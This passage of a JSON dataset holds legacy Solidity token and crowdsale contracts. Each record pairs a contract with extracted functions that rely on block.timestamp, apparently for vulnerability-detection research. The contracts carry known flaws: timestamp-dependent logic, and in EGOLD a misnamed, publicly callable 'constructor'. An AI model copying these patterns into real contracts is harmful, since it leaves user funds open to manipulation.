0x8f71659fb57E6C6Be3Ab563D0dD45101235ae762;\n bool constant CONTINUE_MINTING = false;\n}\ncontract ERC223Token is ERC223Basic, BasicToken, FailingERC223Receiver {\n using SafeMath for uint;\n function transfer(address _to, uint _value, bytes _data) public returns (bool) {\n uint codeLength;\n assembly {\n codeLength := extcodesize(_to)\n }\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n if(codeLength > 0) {\n ERC223Receiver receiver = ERC223Receiver(_to);\n receiver.tokenFallback(msg.sender, _value, _data);\n }\n Transfer(msg.sender, _to, _value, _data);\n return true;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n bytes memory empty;\n return transfer(_to, _value, empty);\n }\n}\ncontract EGOLD is Consts, FreezableMintableToken, BurnableToken, Pausable\n{\n event Initialized();\n bool public initialized = false;\n function MainToken() public {\n init();\n transferOwnership(TARGET_USER);\n }\n function init() private {\n require(!initialized);\n initialized = true;\n if (PAUSED) {\n pause();\n }\n address[1] memory addresses = [address(0x8f71659fb57E6C6Be3Ab563D0dD45101235ae762)];\n uint[1] memory amounts = [uint(100000000000000000000000000)];\n uint64[1] memory freezes = [uint64(0)];\n for (uint i = 0; i < addresses.length; i++) {\n if (freezes[i] == 0) {\n mint(addresses[i], amounts[i]);\n } else {\n mintAndFreeze(addresses[i], amounts[i], freezes[i]);\n }\n }\n if (!CONTINUE_MINTING) {\n finishMinting();\n }\n Initialized();\n }\n function name() pure public returns (string _name) {\n return TOKEN_NAME;\n }\n function symbol() pure public returns (string _symbol) {\n return TOKEN_SYMBOL;\n }\n function decimals() pure public returns (uint8 _decimals) {\n return TOKEN_DECIMALS_UINT8;\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool _success) {\n require(!paused);\n return super.transferFrom(_from, _to, _value);\n }\n function transfer(address _to, uint256 _value) public returns (bool _success) {\n require(!paused);\n return super.transfer(_to, _value);\n }\n}",
  "extract_feature": [
    "function releaseOnce() public {\nbytes32 headKey = toKey(msg.sender, 0);\nuint64 head = chains[headKey];\nrequire(head != 0);\nrequire(uint64(block.timestamp) > head);\nbytes32 currentKey = toKey(msg.sender, head);\nuint64 next = chains[currentKey];\nuint amount = freezings[currentKey];\ndelete freezings[currentKey];\nbalances[msg.sender] = balances[msg.sender].add(amount);\nfreezingBalance[msg.sender] = freezingBalance[msg.sender].sub(amount);\nif (next == 0) {\ndelete chains[headKey];\n}\nelse {\nchains[headKey] = next;\ndelete chains[currentKey];\n}\nReleased(msg.sender, amount);\n}",
    "function releaseAll() public returns (uint tokens) {\nuint release;\nuint balance;\n(release, balance) = getFreezing(msg.sender, 0);\nwhile (release != 0 && block.timestamp > release) {\nreleaseOnce();\ntokens += balance;\n(release, balance) = getFreezing(msg.sender, 0);\n}\n}",
    "function freeze(address _to, uint64 _until) internal {\nrequire(_until > block.timestamp);\nbytes32 key = toKey(_to, _until);\nbytes32 parentKey = toKey(_to, uint64(0));\nuint64 next = chains[parentKey];\nif (next == 0) {\nchains[parentKey] = _until;\nreturn;\n}\nbytes32 nextKey = toKey(_to, next);\nuint parent;\nwhile (next != 0 && _until > next) {\nparent = next;\nparentKey = nextKey;\nnext = chains[nextKey];\nnextKey = toKey(_to, next);\n}\nif (_until == next) {\nreturn;\n}\nif (next != 0) {\nchains[key] = next;\n}\nchains[parentKey] = _until;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaacfa0e1460cdfa1f94"
  },
  "filename": "9779.sol",
  "content": "pragma solidity ^0.4.11;\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public constant returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract SafeMath {\n function safeMul(uint a, uint b) internal returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function safeDiv(uint a, uint b) internal returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function safeSub(uint a, uint b) internal returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function safeAdd(uint a, uint b) internal returns (uint) {\n uint c = a + b;\n assert(c>=a && c>=b);\n return c;\n }\n function max64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a >= b ? a : b;\n }\n function min64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a < b ? a : b;\n }\n function max256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a >= b ? a : b;\n }\n function min256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a < b ? a : b;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\nlibrary SafeMathLibExt {\n function times(uint a, uint b) returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function divides(uint a, uint b) returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function minus(uint a, uint b) returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function plus(uint a, uint b) returns (uint) {\n uint c = a + b;\n assert(c>=a);\n return c;\n }\n}\ncontract Haltable is Ownable {\n bool public halted;\n modifier stopInEmergency {\n if (halted) throw;\n _;\n }\n modifier stopNonOwnersInEmergency {\n if (halted && msg.sender != owner) throw;\n _;\n }\n modifier onlyInEmergency {\n if (!halted) throw;\n _;\n }\n function halt() external onlyOwner {\n halted = true;\n }\n function unhalt() external onlyOwner onlyInEmergency {\n halted = false;\n }\n}\ncontract PricingStrategy {\n address public tier;\n function isPricingStrategy() public constant returns (bool) {\n return true;\n }\n function isSane(address crowdsale) public constant returns (bool) {\n return true;\n }\n function isPresalePurchase(address purchaser) public constant returns (bool) {\n return false;\n }\n function updateRate(uint newOneTokenInWei) public;\n function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public constant returns (uint tokenAmount);\n}\ncontract FinalizeAgent {\n bool public reservedTokensAreDistributed = false;\n function isFinalizeAgent() public constant returns(bool) {\n return true;\n }\n function isSane() public constant returns (bool);\n function distributeReservedTokens(uint reservedTokensDistributionBatch);\n function finalizeCrowdsale();\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public constant returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract FractionalERC20Ext is ERC20 {\n uint public decimals;\n uint public minCap;\n}\ncontract CrowdsaleExt is Haltable {\n uint public MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE = 5;\n using SafeMathLibExt for uint;\n FractionalERC20Ext public token;\n PricingStrategy public pricingStrategy;\n FinalizeAgent public finalizeAgent;\n string public name;\n address public multisigWallet;\n uint public minimumFundingGoal;\n uint public startsAt;\n uint public endsAt;\n uint public tokensSold = 0;\n uint public weiRaised = 0;\n uint public investorCount = 0;\n bool public finalized;\n bool public isWhiteListed;\n address[] public joinedCrowdsales;\n uint8 public joinedCrowdsalesLen = 0;\n uint8 public joinedCrowdsalesLenMax = 50;\n struct JoinedCrowdsaleStatus {\n bool isJoined;\n uint8 position;\n }\n mapping (address => JoinedCrowdsaleStatus) joinedCrowdsaleState;\n mapping (address => uint256) public investedAmountOf;\n mapping (address => uint256) public tokenAmountOf;\n struct WhiteListData {\n bool status;\n uint minCap;\n uint maxCap;\n }\n bool public isUpdatable;\n mapping (address => WhiteListData) public earlyParticipantWhitelist;\n address[] public whitelistedParticipants;\n uint public ownerTestValue;\n enum State{Unknown, Preparing, PreFunding, Funding, Success, Failure, Finalized}\n event Invested(address investor, uint weiAmount, uint tokenAmount, uint128 customerId);\n event Whitelisted(address addr, bool status, uint minCap, uint maxCap);\n event WhitelistItemChanged(address addr, bool status, uint minCap, uint maxCap);\n event StartsAtChanged(uint newStartsAt);\n event EndsAtChanged(uint newEndsAt);\n function CrowdsaleExt(string _name, address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal, bool _isUpdatable, bool _isWhiteListed) {\n owner = msg.sender;\n name = _name;\n token = FractionalERC20Ext(_token);\n setPricingStrategy(_pricingStrategy);\n multisigWallet = _multisigWallet;\n if(multisigWallet == 0) {\n throw;\n }\n if(_start == 0) {\n throw;\n }\n startsAt = _start;\n if(_end == 0) {\n throw;\n }\n endsAt = _end;\n if(startsAt >= endsAt) {\n throw;\n }\n minimumFundingGoal = _minimumFundingGoal;\n isUpdatable = _isUpdatable;\n isWhiteListed = _isWhiteListed;\n }\n function() payable {\n throw;\n }\n function investInternal(address receiver, uint128 customerId) stopInEmergency private {\n if(getState() == State.PreFunding) {\n throw;\n } else if(getState() == State.Funding) {\n if(isWhiteListed) {\n if(!earlyParticipantWhitelist[receiver].status) {\n throw;\n }\n }\n } else {\n throw;\n }\n uint weiAmount = msg.value;\n uint tokenAmount = pricingStrategy.calculatePrice(weiAmount, weiRaised, tokensSold, msg.sender, token.decimals());\n if(tokenAmount == 0) {\n throw;\n }\n if(isWhiteListed) {\n if(tokenAmount < earlyParticipantWhitelist[receiver].minCap && tokenAmountOf[receiver] == 0) {\n throw;\n }\n if (isBreakingInvestorCap(receiver, tokenAmount)) {\n throw;\n }\n updateInheritedEarlyParticipantWhitelist(receiver, tokenAmount);\n } else {\n if(tokenAmount < token.minCap() && tokenAmountOf[receiver] == 0) {\n throw;\n }\n }\n if(investedAmountOf[receiver] == 0) {\n investorCount++;\n }\n investedAmountOf[receiver] = investedAmountOf[receiver].plus(weiAmount);\n tokenAmountOf[receiver] = tokenAmountOf[receiver].plus(tokenAmount);\n weiRaised = weiRaised.plus(weiAmount);\n tokensSold = tokensSold.plus(tokenAmount);\n if(isBreakingCap(weiAmount, tokenAmount, weiRaised, tokensSold)) {\n throw;\n }\n assignTokens(receiver, tokenAmount);\n if(!multisigWallet.send(weiAmount)) throw;\n Invested(receiver, weiAmount, tokenAmount, customerId);\n }\n function invest(address addr) public payable {\n investInternal(addr, 0);\n }\n function buy() public payable {\n invest(msg.sender);\n }\n function distributeReservedTokens(uint reservedTokensDistributionBatch) public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.distributeReservedTokens(reservedTokensDistributionBatch);\n }\n }\n function areReservedTokensDistributed() public constant returns (bool) {\n return finalizeAgent.reservedTokensAreDistributed();\n }\n function canDistributeReservedTokens() public constant returns(bool) {\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if ((lastTierCntrct.getState() == State.Success) && !lastTierCntrct.halted() && !lastTierCntrct.finalized() && !lastTierCntrct.areReservedTokensDistributed()) return true;\n return false;\n }\n function finalize() public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.finalizeCrowdsale();\n }\n finalized = true;\n }\n function setFinalizeAgent(FinalizeAgent addr) public onlyOwner {\n assert(address(addr) != address(0));\n assert(address(finalizeAgent) == address(0));\n finalizeAgent = addr;\n if(!finalizeAgent.isFinalizeAgent()) {\n throw;\n }\n }\n function setEarlyParticipantWhitelist(address addr, bool status, uint minCap, uint maxCap) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(maxCap > 0);\n assert(minCap <= maxCap);\n assert(now <= endsAt);\n if (!isAddressWhitelisted(addr)) {\n whitelistedParticipants.push(addr);\n Whitelisted(addr, status, minCap, maxCap);\n } else {\n WhitelistItemChanged(addr, status, minCap, maxCap);\n }\n earlyParticipantWhitelist[addr] = WhiteListData({status:status, minCap:minCap, maxCap:maxCap});\n }\n function setEarlyParticipantWhitelistMultiple(address[] addrs, bool[] statuses, uint[] minCaps, uint[] maxCaps) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(now <= endsAt);\n assert(addrs.length == statuses.length);\n assert(statuses.length == minCaps.length);\n assert(minCaps.length == maxCaps.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n setEarlyParticipantWhitelist(addrs[iterator], statuses[iterator], minCaps[iterator], maxCaps[iterator]);\n }\n }\n function updateInheritedEarlyParticipantWhitelist(address reciever, uint tokensBought) private {\n if (!isWhiteListed) throw;\n if (tokensBought < earlyParticipantWhitelist[reciever].minCap && tokenAmountOf[reciever] == 0) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n crowdsale.updateEarlyParticipantWhitelist(reciever, tokensBought);\n }\n }\n function updateEarlyParticipantWhitelist(address addr, uint tokensBought) public {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(now <= endsAt);\n assert(isTierJoined(msg.sender));\n if (tokensBought < earlyParticipantWhitelist[addr].minCap && tokenAmountOf[addr] == 0) throw;\n uint newMaxCap = earlyParticipantWhitelist[addr].maxCap;\n newMaxCap = newMaxCap.minus(tokensBought);\n earlyParticipantWhitelist[addr] = WhiteListData({status:earlyParticipantWhitelist[addr].status, minCap:0, maxCap:newMaxCap});\n }\n function isAddressWhitelisted(address addr) public constant returns(bool) {\n for (uint i = 0; i < whitelistedParticipants.length; i++) {\n if (whitelistedParticipants[i] == addr) {\n return true;\n break;\n }\n }\n return false;\n }\n function whitelistedParticipantsLength() public constant returns (uint) {\n return whitelistedParticipants.length;\n }\n function isTierJoined(address addr) public constant returns(bool) {\n return joinedCrowdsaleState[addr].isJoined;\n }\n function getTierPosition(address addr) public constant returns(uint8) {\n return joinedCrowdsaleState[addr].position;\n }\n function getLastTier() public constant returns(address) {\n if (joinedCrowdsalesLen > 0)\n return joinedCrowdsales[joinedCrowdsalesLen - 1];\n else\n return address(0);\n }\n function setJoinedCrowdsales(address addr) private onlyOwner {\n assert(addr != address(0));\n assert(joinedCrowdsalesLen <= joinedCrowdsalesLenMax);\n assert(!isTierJoined(addr));\n joinedCrowdsales.push(addr);\n joinedCrowdsaleState[addr] = JoinedCrowdsaleStatus({\n isJoined: true,\n position: joinedCrowdsalesLen\n });\n joinedCrowdsalesLen++;\n }\n function updateJoinedCrowdsalesMultiple(address[] addrs) public onlyOwner {\n assert(addrs.length > 0);\n assert(joinedCrowdsalesLen == 0);\n assert(addrs.length <= joinedCrowdsalesLenMax);\n for (uint8 iter = 0; iter < addrs.length; iter++) {\n setJoinedCrowdsales(addrs[iter]);\n }\n }\n function setStartsAt(uint time) onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(time <= endsAt);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = 0; j < tierPosition; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time >= crowdsale.endsAt());\n }\n startsAt = time;\n StartsAtChanged(startsAt);\n }\n function setEndsAt(uint time) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(startsAt <= time);\n assert(now <= endsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time <= crowdsale.startsAt());\n }\n endsAt = time;\n EndsAtChanged(endsAt);\n }\n function setPricingStrategy(PricingStrategy _pricingStrategy) public onlyOwner {\n assert(address(_pricingStrategy) != address(0));\n assert(address(pricingStrategy) == address(0));\n pricingStrategy = _pricingStrategy;\n if(!pricingStrategy.isPricingStrategy()) {\n throw;\n }\n }\n function setMultisig(address addr) public onlyOwner {\n if(investorCount > MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE) {\n throw;\n }\n multisigWallet = addr;\n }\n function isMinimumGoalReached() public constant returns (bool reached) {\n return weiRaised >= minimumFundingGoal;\n }\n function isFinalizerSane() public constant returns (bool sane) {\n return finalizeAgent.isSane();\n }\n function isPricingSane() public constant returns (bool sane) {\n return pricingStrategy.isSane(address(this));\n }\n function getState() public constant returns (State) {\n if(finalized) return State.Finalized;\n else if (address(finalizeAgent) == 0) return State.Preparing;\n else if (!finalizeAgent.isSane()) return State.Preparing;\n else if (!pricingStrategy.isSane(address(this))) return State.Preparing;\n else if (block.timestamp < startsAt) return State.PreFunding;\n else if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\n else if (isMinimumGoalReached()) return State.Success;\n else return State.Failure;\n }\n function isCrowdsale() public constant returns (bool) {\n return true;\n }\n modifier inState(State state) {\n if(getState() != state) throw;\n _;\n }\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) public constant returns (bool limitBroken);\n function isBreakingInvestorCap(address receiver, uint tokenAmount) public constant returns (bool limitBroken);\n function isCrowdsaleFull() public constant returns (bool);\n function assignTokens(address receiver, uint tokenAmount) private;\n}\ncontract StandardToken is ERC20, SafeMath {\n event Minted(address receiver, uint amount);\n mapping(address => uint) balances;\n mapping (address => mapping (address => uint)) allowed;\n function isToken() public constant returns (bool weAre) {\n return true;\n }\n function transfer(address _to, uint _value) returns (bool success) {\n balances[msg.sender] = safeSub(balances[msg.sender], _value);\n balances[_to] = safeAdd(balances[_to], _value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint _value) returns (bool success) {\n uint _allowance = allowed[_from][msg.sender];\n balances[_to] = safeAdd(balances[_to], _value);\n balances[_from] = safeSub(balances[_from], _value);\n allowed[_from][msg.sender] = safeSub(_allowance, _value);\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint _value) returns (bool success) {\n if ((_value != 0) && (allowed[msg.sender][_spender] != 0)) throw;\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint remaining) {\n return allowed[_owner][_spender];\n }\n}\ncontract UpgradeAgent {\n uint public originalSupply;\n function isUpgradeAgent() public constant returns (bool) {\n return true;\n }\n function upgradeFrom(address _from, uint256 _value) public;\n}\ncontract UpgradeableToken is StandardToken {\n address public upgradeMaster;\n UpgradeAgent public upgradeAgent;\n uint256 public totalUpgraded;\n enum UpgradeState {Unknown, NotAllowed, WaitingForAgent, ReadyToUpgrade, Upgrading}\n event Upgrade(address indexed _from, address indexed _to, uint256 _value);\n event UpgradeAgentSet(address agent);\n function UpgradeableToken(address _upgradeMaster) {\n upgradeMaster = _upgradeMaster;\n }\n function upgrade(uint256 value) public {\n UpgradeState state = getUpgradeState();\n if(!(state == UpgradeState.ReadyToUpgrade || state == UpgradeState.Upgrading)) {\n throw;\n }\n if (value == 0) throw;\n balances[msg.sender] = safeSub(balances[msg.sender], value);\n totalSupply = safeSub(totalSupply, value);\n totalUpgraded = safeAdd(totalUpgraded, value);\n upgradeAgent.upgradeFrom(msg.sender, value);\n Upgrade(msg.sender, upgradeAgent, value);\n }\n function setUpgradeAgent(address agent) external {\n if(!canUpgrade()) {\n throw;\n }\n if (agent == 0x0) throw;\n if (msg.sender != upgradeMaster) throw;\n if (getUpgradeState() == UpgradeState.Upgrading) throw;\n upgradeAgent = UpgradeAgent(agent);\n if(!upgradeAgent.isUpgradeAgent()) throw;\n if (upgradeAgent.originalSupply() != totalSupply) throw;\n UpgradeAgentSet(upgradeAgent);\n }\n function getUpgradeState() public constant returns(UpgradeState) {\n if(!canUpgrade()) return UpgradeState.NotAllowed;\n else if(address(upgradeAgent) == 0x00) return UpgradeState.WaitingForAgent;\n else if(totalUpgraded == 0) return UpgradeState.ReadyToUpgrade;\n else return UpgradeState.Upgrading;\n }\n function setUpgradeMaster(address master) public {\n if (master == 0x0) throw;\n if (msg.sender != upgradeMaster) throw;\n upgradeMaster = master;\n }\n function canUpgrade() public constant returns(bool) {\n return true;\n }\n}\ncontract ReleasableToken is ERC20, Ownable {\n address public releaseAgent;\n bool public released = false;\n mapping (address => bool) public transferAgents;\n modifier canTransfer(address _sender) {\n if(!released) {\n if(!transferAgents[_sender]) {\n throw;\n }\n }\n _;\n }\n function setReleaseAgent(address addr) onlyOwner inReleaseState(false) public {\n releaseAgent = addr;\n }\n function setTransferAgent(address addr, bool state) onlyOwner inReleaseState(false) public {\n transferAgents[addr] = state;\n }\n function releaseTokenTransfer() public onlyReleaseAgent {\n released = true;\n }\n modifier inReleaseState(bool releaseState) {\n if(releaseState != released) {\n throw;\n }\n _;\n }\n modifier onlyReleaseAgent() {\n if(msg.sender != releaseAgent) {\n throw;\n }\n _;\n }\n function transfer(address _to, uint _value) canTransfer(msg.sender) returns (bool success) {\n return super.transfer(_to, _value);\n }\n function transferFrom(address _from, address _to, uint _value) canTransfer(_from) returns (bool success) {\n return super.transferFrom(_from, _to, _value);\n }\n}\ncontract MintableTokenExt is StandardToken, Ownable {\n using SafeMathLibExt for uint;\n bool public mintingFinished = false;\n mapping (address => bool) public mintAgents;\n event MintingAgentChanged(address addr, bool state );\n struct ReservedTokensData {\n uint inTokens;\n uint inPercentageUnit;\n uint inPercentageDecimals;\n bool isReserved;\n bool isDistributed;\n }\n mapping (address => ReservedTokensData) public reservedTokensList;\n address[] public reservedTokensDestinations;\n uint public reservedTokensDestinationsLen = 0;\n bool reservedTokensDestinationsAreSet = false;\n modifier onlyMintAgent() {\n if(!mintAgents[msg.sender]) {\n throw;\n }\n _;\n }\n modifier canMint() {\n if(mintingFinished) throw;\n _;\n }\n function finalizeReservedAddress(address addr) public onlyMintAgent canMint {\n ReservedTokensData storage reservedTokensData = reservedTokensList[addr];\n reservedTokensData.isDistributed = true;\n }\n function isAddressReserved(address addr) public constant returns (bool isReserved) {\n return reservedTokensList[addr].isReserved;\n }\n function areTokensDistributedForAddress(address addr) public constant returns (bool isDistributed) {\n return reservedTokensList[addr].isDistributed;\n }\n function getReservedTokens(address addr) public constant returns (uint inTokens) {\n return reservedTokensList[addr].inTokens;\n }\n function getReservedPercentageUnit(address addr) public constant returns (uint inPercentageUnit) {\n return reservedTokensList[addr].inPercentageUnit;\n }\n function getReservedPercentageDecimals(address addr) public constant returns (uint inPercentageDecimals) {\n return reservedTokensList[addr].inPercentageDecimals;\n }\n function setReservedTokensListMultiple(\n address[] addrs,\n uint[] inTokens,\n uint[] inPercentageUnit,\n uint[] inPercentageDecimals\n ) public canMint onlyOwner {\n assert(!reservedTokensDestinationsAreSet);\n assert(addrs.length == inTokens.length);\n assert(inTokens.length == inPercentageUnit.length);\n assert(inPercentageUnit.length == inPercentageDecimals.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n if (addrs[iterator] != address(0)) {\n setReservedTokensList(addrs[iterator], inTokens[iterator], inPercentageUnit[iterator], inPercentageDecimals[iterator]);\n }\n }\n reservedTokensDestinationsAreSet = true;\n }\n function mint(address receiver, uint amount) onlyMintAgent canMint public {\n totalSupply = totalSupply.plus(amount);\n balances[receiver] = balances[receiver].plus(amount);\n Transfer(0, receiver, amount);\n }\n function setMintAgent(address addr, bool state) onlyOwner canMint public {\n mintAgents[addr] = state;\n MintingAgentChanged(addr, state);\n }\n function setReservedTokensList(address addr, uint inTokens, uint inPercentageUnit, uint inPercentageDecimals) private canMint onlyOwner {\n assert(addr != address(0));\n if (!isAddressReserved(addr)) {\n reservedTokensDestinations.push(addr);\n reservedTokensDestinationsLen++;\n }\n reservedTokensList[addr] = ReservedTokensData({\n inTokens: inTokens,\n inPercentageUnit: inPercentageUnit,\n inPercentageDecimals: inPercentageDecimals,\n isReserved: true,\n isDistributed: false\n });\n }\n}\ncontract CrowdsaleTokenExt is ReleasableToken, MintableTokenExt, UpgradeableToken {\n event UpdatedTokenInformation(string newName, string newSymbol);\n event ClaimedTokens(address indexed _token, address indexed _controller, uint _amount);\n string public name;\n string public symbol;\n uint public decimals;\n uint public minCap;\n function CrowdsaleTokenExt(string _name, string _symbol, uint _initialSupply, uint _decimals, bool _mintable, uint _globalMinCap)\n UpgradeableToken(msg.sender) {\n owner = msg.sender;\n name = _name;\n symbol = _symbol;\n totalSupply = _initialSupply;\n decimals = _decimals;\n minCap = _globalMinCap;\n balances[owner] = totalSupply;\n if(totalSupply > 0) {\n Minted(owner, totalSupply);\n }\n if(!_mintable) {\n mintingFinished = true;\n if(totalSupply == 0) {\n throw;\n }\n }\n }\n function releaseTokenTransfer() public onlyReleaseAgent {\n mintingFinished = true;\n super.releaseTokenTransfer();\n }\n function canUpgrade() public constant returns(bool) {\n return released && super.canUpgrade();\n }\n function setTokenInformation(string _name, string _symbol) onlyOwner {\n name = _name;\n symbol = _symbol;\n UpdatedTokenInformation(name, symbol);\n }\n function claimTokens(address _token) public onlyOwner {\n require(_token != address(0));\n ERC20 token = ERC20(_token);\n uint balance = token.balanceOf(this);\n token.transfer(owner, balance);\n ClaimedTokens(_token, owner, balance);\n }\n}\ncontract ReservedTokensFinalizeAgent is FinalizeAgent {\n using SafeMathLibExt for uint;\n CrowdsaleTokenExt public token;\n CrowdsaleExt public crowdsale;\n uint public distributedReservedTokensDestinationsLen = 0;\n function ReservedTokensFinalizeAgent(CrowdsaleTokenExt _token, CrowdsaleExt _crowdsale) public {\n token = _token;\n crowdsale = _crowdsale;\n }\n function isSane() public constant returns (bool) {\n return (token.releaseAgent() == address(this));\n }\n function distributeReservedTokens(uint reservedTokensDistributionBatch) public {\n assert(msg.sender == address(crowdsale));\n assert(reservedTokensDistributionBatch > 0);\n assert(!reservedTokensAreDistributed);\n assert(distributedReservedTokensDestinationsLen < token.reservedTokensDestinationsLen());\n uint tokensSold = 0;\n for (uint8 i = 0; i < crowdsale.joinedCrowdsalesLen(); i++) {\n CrowdsaleExt tier = CrowdsaleExt(crowdsale.joinedCrowdsales(i));\n tokensSold = tokensSold.plus(tier.tokensSold());\n }\n uint startLooping = distributedReservedTokensDestinationsLen;\n uint batch = token.reservedTokensDestinationsLen().minus(distributedReservedTokensDestinationsLen);\n if (batch >= reservedTokensDistributionBatch) {\n batch = reservedTokensDistributionBatch;\n }\n uint endLooping = startLooping + batch;\n for (uint j = startLooping; j < endLooping; j++) {\n address reservedAddr = token.reservedTokensDestinations(j);\n if (!token.areTokensDistributedForAddress(reservedAddr)) {\n uint allocatedBonusInPercentage;\n uint allocatedBonusInTokens = token.getReservedTokens(reservedAddr);\n uint percentsOfTokensUnit = token.getReservedPercentageUnit(reservedAddr);\n uint percentsOfTokensDecimals = token.getReservedPercentageDecimals(reservedAddr);\n if (percentsOfTokensUnit > 0) {\n allocatedBonusInPercentage = tokensSold * percentsOfTokensUnit / 10**percentsOfTokensDecimals / 100;\n token.mint(reservedAddr, allocatedBonusInPercentage);\n }\n if (allocatedBonusInTokens > 0) {\n token.mint(reservedAddr, allocatedBonusInTokens);\n }\n token.finalizeReservedAddress(reservedAddr);\n distributedReservedTokensDestinationsLen++;\n }\n }\n if (distributedReservedTokensDestinationsLen == token.reservedTokensDestinationsLen()) {\n reservedTokensAreDistributed = true;\n }\n }\n function finalizeCrowdsale() public {\n assert(msg.sender == address(crowdsale));\n if (token.reservedTokensDestinationsLen() > 0) {\n assert(reservedTokensAreDistributed);\n }\n token.releaseTokenTransfer();\n }\n}",
  "extract_feature": [
    "function getState() public constant returns (State) {\nif(finalized) return State.Finalized;\nelse if (address(finalizeAgent) == 0) return State.Preparing;\nelse if (!finalizeAgent.isSane()) return State.Preparing;\nelse if (!pricingStrategy.isSane(address(this))) return State.Preparing;\nelse if (block.timestamp < startsAt) return State.PreFunding;\nelse if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\nelse if (isMinimumGoalReached()) return State.Success;\nelse return State.Failure;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaacfa0e1460cdfa1f95"
  },
  "filename": "9780.sol",
  "content": "pragma solidity ^0.4.8;\ncontract SafeMath {\n function safeMul(uint a, uint b) internal returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function safeDiv(uint a, uint b) internal returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function safeSub(uint a, uint b) internal returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function safeAdd(uint a, uint b) internal returns (uint) {\n uint c = a + b;\n assert(c>=a && c>=b);\n return c;\n }\n function max64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a >= b ? a : b;\n }\n function min64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a < b ? a : b;\n }\n function max256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a >= b ? a : b;\n }\n function min256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a < b ? a : b;\n }\n}\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public constant returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\nlibrary 